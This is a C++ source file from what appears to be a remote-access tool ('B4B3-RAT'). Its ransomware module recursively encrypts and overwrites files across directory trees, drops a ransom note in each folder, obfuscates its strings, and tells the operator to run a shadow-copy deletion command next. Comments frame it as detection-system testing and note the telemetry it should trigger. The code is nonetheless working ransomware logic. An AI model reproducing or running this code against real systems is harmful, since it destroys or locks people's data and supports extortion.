#include "RansomSim.h"
#include "FileCryptor.h"

// ── Recursive directory walker ─────────────────────────────────────────────────

static int WalkEncrypt(const std::string& dir, const std::string& key,
                       std::string& log, int depth) {
    if (depth > 8) return 0;

    // Drop ransom note — presence of _README.txt in every folder is a classic
    // ransomware IoC pattern (MITRE T1486, matches Conti/REvil/BlackCat note drops).
    std::string note = dir + S("\\_README.txt");
    {
        std::ofstream nf(note.c_str());
        nf << S("[B4B3-RAT SECURITY TEST]\r\n\r\n")
           << S("All files in this directory have been encrypted for detection-system testing.\r\n")
           << S("This is NOT a real ransomware attack. To restore your files:\r\n\r\n")
           << S("  filedecrypt <file>.b4db4b3 ") << key << S("\r\n\r\n")
           << S("Or use: ransom decrypt ") << dir << S(" ") << key << S("\r\n");
    }

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA((dir + S("\\*")).c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;

    int count = 0;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        std::string path = dir + S("\\") + fd.cFileName;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            count += WalkEncrypt(path, key, log, depth + 1);
            continue;
        }

        std::string name(fd.cFileName);
        // Skip already-encrypted files and the ransom note itself
        if (name.size() >= 8 && name.compare(name.size()-8, 8, S(".b4db4b3")) == 0) continue;
        if (name == S("_README.txt")) continue;

        // Skip very large files to avoid long stalls
        ULARGE_INTEGER sz;
        sz.LowPart  = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        if (sz.QuadPart > 50ULL * 1024 * 1024) {
            log += S("  skipped (>50MB): ") + path + S("\n");
            continue;
        }

        // FileCryptor::FileCrypt appends .b4db4b3 and overwrites the original.
        // Detection: each rename triggers a Sysmon FileCreate event with the new extension,
        // and the write-pattern triggers behavioural entropy monitoring in EDRs.
        if (FileCryptor::FileCrypt(path, key)) {
            log += S("  encrypted: ") + path + S("\n");
            ++count;
        } else {
            log += S("  FAILED:    ") + path + S("\n");
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return count;
}

static int WalkDecrypt(const std::string& dir, const std::string& key,
                       std::string& log, int depth) {
    if (depth > 8) return 0;

    DeleteFileA((dir + S("\\_README.txt")).c_str());

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA((dir + S("\\*")).c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;

    int count = 0;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        std::string path = dir + S("\\") + fd.cFileName;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            count += WalkDecrypt(path, key, log, depth + 1);
            continue;
        }

        std::string name(fd.cFileName);
        if (name.size() >= 8 && name.compare(name.size()-8, 8, S(".b4db4b3")) == 0) {
            if (FileCryptor::FileDecrypt(path, key)) {
                log += S("  decrypted: ") + path + S("\n");
                ++count;
            } else {
                log += S("  FAILED:    ") + path + S("\n");
            }
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return count;
}

// ── Public API ─────────────────────────────────────────────────────────────────

std::string RansomSim::EncryptDir(const std::string& dir, const std::string& key) {
    std::string log;
    int n = WalkEncrypt(dir, key, log, 0);
    return S("ransom encrypt: ") + std::to_string(n) + S(" file(s) encrypted in ") + dir +
           S("\n\nChain test: run `af vssdelete` next to simulate full ransomware kill-chain.\n\n") +
           log;
}

std::string RansomSim::DecryptDir(const std::string& dir, const std::string& key) {
    std::string log;
    int n = WalkDecrypt(dir, key, log, 0);
    return S("ransom decrypt: ") + std::to_string(n) + S(" file(s) restored in ") + dir +
           S("\n") + log;
}
